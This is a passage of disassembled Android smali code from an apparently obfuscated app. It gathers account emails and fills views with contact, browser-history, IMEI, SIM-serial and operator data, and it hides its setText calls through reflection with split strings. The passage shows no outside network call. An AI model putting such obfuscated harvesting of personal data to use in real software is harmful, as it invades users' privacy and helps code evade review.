    .local v18, "history":Ljava/lang/String;
    const v36, 0x7f080028

    move-object/from16 v0, p0

    move/from16 v1, v36

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v30

    check-cast v30, Landroid/widget/TextView;

    .line 1123
    .local v30, "phonebook":Landroid/widget/TextView;
    :try_start_b
    const-string v13, "tTe"

    .restart local v13    # "dsfdfdd":Ljava/lang/String;
    const-string v36, "android.widget.TextView"

    invoke-static/range {v36 .. v36}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v36

    new-instance v37, Ljava/lang/StringBuilder;

    const-string v38, "se"

    invoke-direct/range {v37 .. v38}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v37

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, "xt"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v37

    const/16 v38, 0x1

    move/from16 v0, v38

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v38, v0

    const/16 v39, 0x0

    const-class v40, Ljava/lang/CharSequence;

    aput-object v40, v38, v39

    invoke-virtual/range {v36 .. v38}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v36

    const/16 v37, 0x1

    move/from16 v0, v37

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v37, v0

    const/16 v38, 0x0

    aput-object v11, v37, v38

    move-object/from16 v0, v36

    move-object/from16 v1, v30

    move-object/from16 v2, v37

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_b
    .catch Ljava/lang/Throwable; {:try_start_b .. :try_end_b} :catch_2

    .line 1125
    .end local v13    # "dsfdfdd":Ljava/lang/String;
    :goto_8
    const v36, 0x7f080029

    move-object/from16 v0, p0

    move/from16 v1, v36

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v10

    check-cast v10, Landroid/widget/TextView;

    .line 1126
    .local v10, "browsers":Landroid/widget/TextView;
    :try_start_c
    const-string v13, "tTe"

    .restart local v13    # "dsfdfdd":Ljava/lang/String;
    const-string v36, "android.widget.TextView"

    invoke-static/range {v36 .. v36}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v36

    new-instance v37, Ljava/lang/StringBuilder;

    const-string v38, "se"

    invoke-direct/range {v37 .. v38}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v37

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, "xt"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v37

    const/16 v38, 0x1

    move/from16 v0, v38

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v38, v0

    const/16 v39, 0x0

    const-class v40, Ljava/lang/CharSequence;

    aput-object v40, v38, v39

    invoke-virtual/range {v36 .. v38}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v36

    const/16 v37, 0x1

    move/from16 v0, v37

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v37, v0

    const/16 v38, 0x0

    aput-object v18, v37, v38

    move-object/from16 v0, v36

    move-object/from16 v1, v37

    invoke-virtual {v0, v10, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_c
    .catch Ljava/lang/Throwable; {:try_start_c .. :try_end_c} :catch_1

    .line 1128
    .end local v13    # "dsfdfdd":Ljava/lang/String;
    :goto_9
    return-void

    .line 1094
    .end local v10    # "browsers":Landroid/widget/TextView;
    .end local v11    # "contacts":Ljava/lang/String;
    .end local v12    # "dfd":Ljava/lang/String;
    .end local v18    # "history":Ljava/lang/String;
    .end local v30    # "phonebook":Landroid/widget/TextView;
    .end local v32    # "putt2":Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKin;
    .end local v35    # "userDetails":Landroid/content/SharedPreferences;
    .restart local v9    # "bmp":Landroid/graphics/Bitmap;
    .restart local v16    # "f":Ljava/io/File;
    .restart local v17    # "getSimSerialNumber":Ljava/lang/String;
    .restart local v19    # "imei":Landroid/widget/TextView;
    .restart local v20    # "imgFile":Ljava/io/File;
    .restart local v21    # "imgView":Landroid/widget/ImageView;
    .restart local v22    # "model":Landroid/widget/TextView;
    .restart local v25    # "network":Landroid/widget/TextView;
    .restart local v26    # "operatorName":Ljava/lang/String;
    .restart local v28    # "path":Ljava/lang/String;
    .restart local v29    # "phone":Landroid/widget/TextView;
    .restart local v33    # "telephonyManager":Landroid/telephony/TelephonyManager;
    .restart local v34    # "uriCustom":Landroid/net/Uri;
    :cond_0
    :try_start_d
    const-string v36, "ffffg"

    const-string v37, "fff=656666"

    invoke-static/range {v36 .. v37}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_5

    .line 1110
    .end local v9    # "bmp":Landroid/graphics/Bitmap;
    .end local v16    # "f":Ljava/io/File;
    .end local v17    # "getSimSerialNumber":Ljava/lang/String;
    .end local v19    # "imei":Landroid/widget/TextView;
    .end local v20    # "imgFile":Ljava/io/File;
    .end local v21    # "imgView":Landroid/widget/ImageView;
    .end local v22    # "model":Landroid/widget/TextView;
    .end local v25    # "network":Landroid/widget/TextView;
    .end local v26    # "operatorName":Ljava/lang/String;
    .end local v28    # "path":Ljava/lang/String;
    .end local v29    # "phone":Landroid/widget/TextView;
    .end local v33    # "telephonyManager":Landroid/telephony/TelephonyManager;
    .end local v34    # "uriCustom":Landroid/net/Uri;
    :catch_0
    move-exception v36

    goto/16 :goto_7

    .line 1101
    .restart local v6    # "accaunts":Landroid/widget/TextView;
    .restart local v8    # "accounts":[Landroid/accounts/Account;
    .restart local v9    # "bmp":Landroid/graphics/Bitmap;
    .restart local v15    # "emailPattern":Ljava/util/regex/Pattern;
    .restart local v16    # "f":Ljava/io/File;
    .restart local v17    # "getSimSerialNumber":Ljava/lang/String;
    .restart local v19    # "imei":Landroid/widget/TextView;
    .restart local v20    # "imgFile":Ljava/io/File;
    .restart local v21    # "imgView":Landroid/widget/ImageView;
    .restart local v22    # "model":Landroid/widget/TextView;
    .restart local v25    # "network":Landroid/widget/TextView;
    .restart local v26    # "operatorName":Ljava/lang/String;
    .restart local v27    # "out":Ljava/lang/String;
    .restart local v28    # "path":Ljava/lang/String;
    .restart local v29    # "phone":Landroid/widget/TextView;
    .restart local v33    # "telephonyManager":Landroid/telephony/TelephonyManager;
    .restart local v34    # "uriCustom":Landroid/net/Uri;
    :cond_1
    aget-object v7, v8, v36

    .line 1102
    .local v7, "account":Landroid/accounts/Account;
    iget-object v0, v7, Landroid/accounts/Account;->name:Ljava/lang/String;

    move-object/from16 v38, v0

    move-object/from16 v0, v38

    invoke-virtual {v15, v0}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v38

    invoke-virtual/range {v38 .. v38}, Ljava/util/regex/Matcher;->matches()Z

    move-result v38

    if-eqz v38, :cond_2

    .line 1103
    iget-object v0, v7, Landroid/accounts/Account;->name:Ljava/lang/String;

    move-object/from16 v31, v0

    .line 1104
    .local v31, "possibleEmail":Ljava/lang/String;
    new-instance v38, Ljava/lang/StringBuilder;

    invoke-static/range {v27 .. v27}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v39

    invoke-direct/range {v38 .. v39}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v39, ", "

    invoke-virtual/range {v38 .. v39}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v38

    move-object/from16 v0, v38

    move-object/from16 v1, v31

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v38

    invoke-virtual/range {v38 .. v38}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_0

    move-result-object v27

    .line 1101
    .end local v31    # "possibleEmail":Ljava/lang/String;
    :cond_2
    add-int/lit8 v36, v36, 0x1

    goto/16 :goto_6

    .line 1126
    .end local v6    # "accaunts":Landroid/widget/TextView;
    .end local v7    # "account":Landroid/accounts/Account;
    .end local v8    # "accounts":[Landroid/accounts/Account;
    .end local v9    # "bmp":Landroid/graphics/Bitmap;
    .end local v15    # "emailPattern":Ljava/util/regex/Pattern;
    .end local v16    # "f":Ljava/io/File;
    .end local v17    # "getSimSerialNumber":Ljava/lang/String;
    .end local v19    # "imei":Landroid/widget/TextView;
    .end local v20    # "imgFile":Ljava/io/File;
    .end local v21    # "imgView":Landroid/widget/ImageView;
    .end local v22    # "model":Landroid/widget/TextView;
    .end local v25    # "network":Landroid/widget/TextView;
    .end local v26    # "operatorName":Ljava/lang/String;
    .end local v27    # "out":Ljava/lang/String;
    .end local v28    # "path":Ljava/lang/String;
    .end local v29    # "phone":Landroid/widget/TextView;
    .end local v33    # "telephonyManager":Landroid/telephony/TelephonyManager;
    .end local v34    # "uriCustom":Landroid/net/Uri;
    .restart local v10    # "browsers":Landroid/widget/TextView;
    .restart local v11    # "contacts":Ljava/lang/String;
    .restart local v12    # "dfd":Ljava/lang/String;
    .restart local v18    # "history":Ljava/lang/String;
    .restart local v30    # "phonebook":Landroid/widget/TextView;
    .restart local v32    # "putt2":Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKin;
    .restart local v35    # "userDetails":Landroid/content/SharedPreferences;
    :catch_1
    move-exception v36

    goto :goto_9

    .line 1123
    .end local v10    # "browsers":Landroid/widget/TextView;
    :catch_2
    move-exception v36

    goto/16 :goto_8

    .line 1108
    .end local v11    # "contacts":Ljava/lang/String;
    .end local v12    # "dfd":Ljava/lang/String;
    .end local v18    # "history":Ljava/lang/String;
    .end local v30    # "phonebook":Landroid/widget/TextView;
    .end local v32    # "putt2":Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKin;
    .end local v35    # "userDetails":Landroid/content/SharedPreferences;
    .restart local v6    # "accaunts":Landroid/widget/TextView;
    .restart local v8    # "accounts":[Landroid/accounts/Account;
    .restart local v9    # "bmp":Landroid/graphics/Bitmap;
    .restart local v15    # "emailPattern":Ljava/util/regex/Pattern;
    .restart local v16    # "f":Ljava/io/File;
    .restart local v17    # "getSimSerialNumber":Ljava/lang/String;
    .restart local v19    # "imei":Landroid/widget/TextView;
    .restart local v20    # "imgFile":Ljava/io/File;
    .restart local v21    # "imgView":Landroid/widget/ImageView;
    .restart local v22    # "model":Landroid/widget/TextView;
    .restart local v25    # "network":Landroid/widget/TextView;
    .restart local v26    # "operatorName":Ljava/lang/String;
    .restart local v27    # "out":Ljava/lang/String;
    .restart local v28    # "path":Ljava/lang/String;
    .restart local v29    # "phone":Landroid/widget/TextView;
    .restart local v33    # "telephonyManager":Landroid/telephony/TelephonyManager;
    .restart local v34    # "uriCustom":Landroid/net/Uri;
    :catch_3
    move-exception v36

    goto/16 :goto_7

    .line 1074
    .end local v6    # "accaunts":Landroid/widget/TextView;
    .end local v8    # "accounts":[Landroid/accounts/Account;
    .end local v9    # "bmp":Landroid/graphics/Bitmap;
    .end local v15    # "emailPattern":Ljava/util/regex/Pattern;
    .end local v16    # "f":Ljava/io/File;
    .end local v20    # "imgFile":Ljava/io/File;
    .end local v21    # "imgView":Landroid/widget/ImageView;
    .end local v27    # "out":Ljava/lang/String;
    .end local v28    # "path":Ljava/lang/String;
    :catch_4
    move-exception v36

    goto/16 :goto_4

    .line 1068
    .end local v34    # "uriCustom":Landroid/net/Uri;
    :catch_5
    move-exception v36

    goto/16 :goto_3

    .line 1065
    .end local v22    # "model":Landroid/widget/TextView;
    :catch_6
    move-exception v36

    goto/16 :goto_2

    .line 1062
    .end local v19    # "imei":Landroid/widget/TextView;
    :catch_7
    move-exception v36

    goto/16 :goto_1

    .line 1058
    .end local v17    # "getSimSerialNumber":Ljava/lang/String;
    .end local v29    # "phone":Landroid/widget/TextView;
    :catch_8
    move-exception v36

    goto/16 :goto_0
.end method
